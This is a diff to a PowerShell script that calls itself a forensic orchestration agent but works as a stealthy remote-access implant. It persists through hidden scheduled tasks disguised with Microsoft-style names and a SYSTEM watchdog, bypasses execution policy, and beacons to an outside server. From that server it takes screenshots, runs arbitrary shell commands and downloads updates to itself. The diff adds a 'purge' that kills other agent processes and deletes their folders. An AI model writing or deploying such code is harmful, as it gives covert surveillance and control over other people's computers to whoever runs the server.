@@ -1,5 +1,5 @@
-# Version: 3.0.0
-# Description: Unified Forensic Orchestration Agent (Pierogi Reconstruction)
+# Version: 3.0.2
+# Description: Unified Forensic Orchestration Agent (Pierogi Reconstruction + Purge)
 
 param(
     [string]$ServerUrl = "https://unified-manager.vercel.app",
@@ -60,18 +60,34 @@ function Take-Screenshot {
     } catch { return $null }
 }
 
-# 2. INSTALLATION (STEALTH v3.0)
+# 2. INSTALLATION (STEALTH v3.0 + AGGRESSIVE PURGE)
 function Install-AgentV3 {
-    Log-Message "Deploying Forensic Agent v3.0.0 (Pierogi Reconstruction)..."
+    Log-Message "Initiating Global Purge & Installation v3.0.2..."
     $MainTask = "Microsoft-Windows-Security-Maintenance"
     $WatchTask = "Microsoft-Windows-Diagnostics-Verify"
 
-    # Cleanup Old Versions
-    Get-ScheduledTask | Where-Object { $_.TaskName -match "Diagnostic-Cleanup|Telemetry-Sync|Unified-Agent" } | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
+    # 1. KILL ALL EXISTING AGENT PROCESSES (Except current)
+    $CurrentPid = $pid
+    Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { 
+        ($_.CommandLine -match "unified-agent|uea_stealth|Microsoft-Windows-Diagnostic") -and ($_.Id -ne $CurrentPid)
+    } | Stop-Process -Force -ErrorAction SilentlyContinue
 
-    Copy-Item -Path $PSCommandPath -Destination $ScriptPath -Force
-    @{ ServerUrl = $ServerUrl } | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
+    # 2. UNREGISTER ALL LEGACY TASKS
+    $LegacyPatterns = "Diagnostic-Cleanup|Telemetry-Sync|Unified-Agent|Microsoft-Windows-Diagnostic|UEA-Heartbeat"
+    Get-ScheduledTask | Where-Object { $_.TaskName -match $LegacyPatterns -and $_.TaskName -ne $MainTask -and $_.TaskName -ne $WatchTask } | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
 
+    # 3. CLEAN UP LEGACY FOLDERS
+    $LegacyPaths = "C:\ProgramData\Unified-Enterprise-Agent", "C:\ProgramData\Microsoft\Diagnostic-Cleanup"
+    foreach ($P in $LegacyPaths) { if (Test-Path $P) { Remove-Item $P -Recurse -Force -ErrorAction SilentlyContinue } }
+
+    # 4. DEPLOY CURRENT VERSION
+    if ($PSCommandPath -and (Test-Path $PSCommandPath) -and ($PSCommandPath -ne $ScriptPath)) {
+        Copy-Item -Path $PSCommandPath -Destination $ScriptPath -Force
+    }
+    
+    @{ ServerUrl = $ServerUrl; Version = "3.0.2" } | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
+
+    # Action & Trigger
     $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
     $Trigger = New-ScheduledTaskTrigger -AtLogOn
     $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
@@ -83,7 +99,7 @@ function Install-AgentV3 {
     $WatchTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
     Register-ScheduledTask -TaskName $WatchTask -Action $WatchAction -Trigger $WatchTrigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -Force | Out-Null
 
-    Log-Message "v3.0.0 Stealth Deployment Successful."
+    Log-Message "v3.0.2 Mastery Established. Old agents purged."
 }
 
 if ($Install) { Install-AgentV3; exit }
@@ -93,13 +109,13 @@ try {
     if (Test-Path $ConfigPath) { $ServerUrl = (Get-Content $ConfigPath | ConvertFrom-Json).ServerUrl }
     $AgentId = Get-AgentId
     $SerialNumber = Get-SerialNumber
-    Log-Message "Forensic Orchestrator Active. Target: $ServerUrl"
+    Log-Message "Forensic Orchestrator v3.0.2 Active. ID: $AgentId"
 
     while($true) {
         try {
             # Heartbeat
             $Payload = @{
-                agentId = $AgentId; serialNumber = $SerialNumber; version = "3.0.0"; status = "online"
+                agentId = $AgentId; serialNumber = $SerialNumber; version = "3.0.2"; status = "online"
                 deviceName = $env:COMPUTERNAME; localIp = Get-LocalIp; os = "Windows $([Environment]::OSVersion.Version)"
             }
             $Heartbeat = Invoke-RestMethod -Uri "$ServerUrl/api/agent/heartbeat" -Method Post -Body ($Payload | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 10
@@ -107,8 +123,6 @@ try {
             # Process Commands
             foreach ($Cmd in $Heartbeat.commands) {
                 $Result = $null
-                Log-Message "Executing: $($Cmd.type)"
-                
                 switch ($Cmd.type) {
                     "SCREENSHOT" { $Result = Take-Screenshot }
                     "shell"      { $Result = powershell.exe -NoProfile -Command $Cmd.payload.command 2>&1 | Out-String }
@@ -123,11 +137,11 @@ try {
             }
 
             # Update Check
-            if ($Heartbeat.latestVersion -and ([version]$Heartbeat.latestVersion -gt [version]"3.0.0")) {
+            if ($Heartbeat.latestVersion -and ([version]$Heartbeat.latestVersion -gt [version]"3.0.2")) {
                 Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile $ScriptPath -UseBasicParsing | Out-Null
                 Install-AgentV3; exit
             }
-        } catch { Log-Message "HB Failed: $_" }
+        } catch { Log-Message "HB Offline: $_" }
         Start-Sleep -Seconds 30
     }
-} catch { Log-Message "Fatal Error: $_" }
+} catch { Log-Message "Critical Loop Error: $_" }
